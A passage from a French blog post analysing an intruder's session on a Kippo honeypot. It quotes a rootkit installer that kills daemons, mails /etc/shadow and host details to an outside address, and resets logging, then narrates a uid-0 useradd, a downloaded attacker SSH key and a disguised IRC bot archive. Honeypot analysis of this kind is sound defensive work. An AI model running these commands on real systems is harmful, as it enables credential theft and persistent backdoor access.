# KILLING SOME LAMME DAEMONS
killall -9 -q nscd >/dev/null 2>&1
killall -9 -q xntps >/dev/null 2>&1
killall -9 -q mountd >/dev/null 2>&1
killall -9 -q mserv >/dev/null 2>&1
killall -9 -q psybnc >/dev/null 2>&1
killall -9 -q t0rns >/dev/null 2>&1
killall -9 -q linsniffer >/dev/null 2>&1
killall -9 -q sniffer >/dev/null 2>&1
killall -9 -q lpsched >/dev/null 2>&1
killall -9 -q sniff >/dev/null 2>&1
killall -9 -q sn1f >/dev/null 2>&1
killall -9 -q sshd2 >/dev/null 2>&1
killall -9 -q xsf >/dev/null 2>&1
killall -9 -q xchk >/dev/null 2>&1
killall -9 -q ssh2d >/dev/null 2>&1

echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# [System Information...]${RES}"
MYIPADDR=`/sbin/ifconfig eth0 | grep "inet addr:" | awk -F ' ' ' {print $2} ' | cut -c6-`
echo "${DCYN}[${WHI}sh${DCYN}]# Hostname :${WHI} `hostname -f` ($MYIPADDR)${RES}"
[coupé]

if [ -f /etc/redhat-release ]; then
  echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/redhat-release`${RES}"
elif [ -f /etc/slackware-version ]; then
  echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/slackware-version`${RES}"
elif [ -f /etc/debian_version ]; then
  echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/debian_version`${RES}"
elif [ -f /etc/SuSE-release ]; then
  echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/SuSE-release`${RES}"
elif [ -f /etc/issue ]; then
  echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/issue`${RES}"
else echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} unknown${RES}"
fi
```

Le setup affiche des informations concernant le système (il devrait peut-être commencer par ça).

```bash
rm -rf /tmp/info_tmp
cat /etc/shadow >> /tmp/.cln
/sbin/ifconfig >> /tmp/.cln
cat /etc/issue >> /tmp/.cln
cat /tmp/.cln | mail $md5sum -s "$1:$2:`hostname -f`:$MYIPADDR"
cat /tmp/.cln | mail -s "rk" norocos@canadianbiotech.com
rm -rf /tmp/.cln
```

Je ne suis pas sûr que le pirate ayant utilisé le rootkit ait fait attention à ça. Peut-être il est partageur ou alors c'est son adresse email (hébergée chez `emaileveryone`).

```bash
endtime=`date +%S`
total=`expr $endtime - $startime`

echo ""
echo "${WHI}--------------------------------------------------------------------${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# ipchains ... ? ${RES}"

if [ -f /sbin/ipchains ]; then
  echo "${WHI}`/sbin/ipchains -L input | head -5`${RES}"
else
  echo ""
  echo "${DCYN}[${WHI}sh${DCYN}]# lucky for u no ipchains found${RES}"
fi

echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# iptables ...?${RES}"

if [ -f /sbin/iptables ]; then
  echo "${WHI}`/sbin/iptables -L input | head -5`${RES}"
else
  echo ""
  echo "${DCYN}[${WHI}sh${DCYN}]# lucky for u no iptables found${RES}"
fi
echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# Just ignore all errors if any ! "
echo "${DCYN}[${WHI}sh${DCYN}]# ============================== ${RED}Backdooring completed in :$total seconds ${RES}"

if [ -f /usr/sbin/syslogd ]; then
  /usr/sbin/syslogd -m 0
else
  /sbin/syslogd -m 0
fi

if [ -f /usr/sbin/inetd ]; then
  killall -HUP inetd >/dev/null 2>&1
elif [ -f /usr/sbin/xinetd ]; then
  killall -HUP xinetd
fi

cd $BASEDIR
rm -rf ../.rc
sendmail root -p norocos@canadianbiotech.com

cd ..
rm -rf .rc rk.jpg
# EOF
```

Après avoir installé le rootkit, notre intrus affiche le contenu de `/etc/passwd` puis tente d'ajouter un utilisateur avec l'uid 0 avec la commande suivante :

```bash
/usr/sbin/useradd -u 0 -g 0 -o -d "/home/admin" admin 2>&1
```

Seulement `Kippo` est assez limité dans ses fonctionnalités et cette commande n'est pas effective. Le pirate tentera de la lancer une nouvelle fois puis abandonnera.

Il va alors télécharger la clé SSH à l'adresse http://unixcrew.t35.com/authorized_keys et la placer dans `/root/.ssh`.  

Le contenu est le suivant :

```plain
ssh-rsa
AAAAB3NzaC1yc2EAAAABJQAAAIBCkXfcxijdvoA3Ee0Ea0yhphOLuvm0+KtEWowekUuokh
2w4H72AKniI37DIuPDtgCHbqNAsUsU33SlZE2wrEo4LQaS3KL1z6egwnuT2PIFP5XV5DUb
7Hck9gloyyUBVr0TVxRwPunuLINEUTi/2LAca1IdOeGfN+g7qlDScHLrXw== TheDemon
```

Pour terminer il télécharge le fichier http://unixcrew.t35.com/poza1.jpg qui est en réalité une archive et la décompresse.  

Cela provoque la génération d'un dossier nommé webmail dans lequel il se place et tape la commande `make` alors qu'aucun `Makefile` n'est présent dans le dossier.  

Dans ce dossier on trouve un bot IRC `EnergyMech` classique configuré pour le pseudo `TheDemon` sur `UnderNet`.  

Il se déconnectera et ne se reconnectera pas...  

Conclusion
----------

On a affaire à un pirate un peu au-dessus du niveau pathétique de ceux que l'on a l'habitude d'observer sur ce type de honeypot. Il cherche à couvrir ses traces avec un rootkit et connait la commande `useradd`. Il se débrouille sous Linux en ligne de commande.  

En revanche il fait un piètre hacker : il installe un rootkit, pas tout récent, pour cacher ses traces mais au lieu de se servir des fonctionnalités du logiciel, il créé un nouvel utilisateur sur le système avec UID 0 et créé un dossier non-caché nommé `webmail` dans le dossier `/root`. Le mot `webmail` ne faisant pas parti des dossiers pris en compte par le rootkit.  

Il installe aussi un bot `EnergyMech` alors que le rootkit inclus une backdoor destinée à être invisible... Bref il utilise des outils dont il ignore le fonctionnement et qui ont probablement laissé un accès à l'auteur original du rootkit, par exemple à l'aide du script nommé simplement `a` lancé discrètement qui créé un utilisateur et envoi un mail à l'adresse que l'on a croisé plusieurs fois...

*Published August 22 2011 at 17:16*
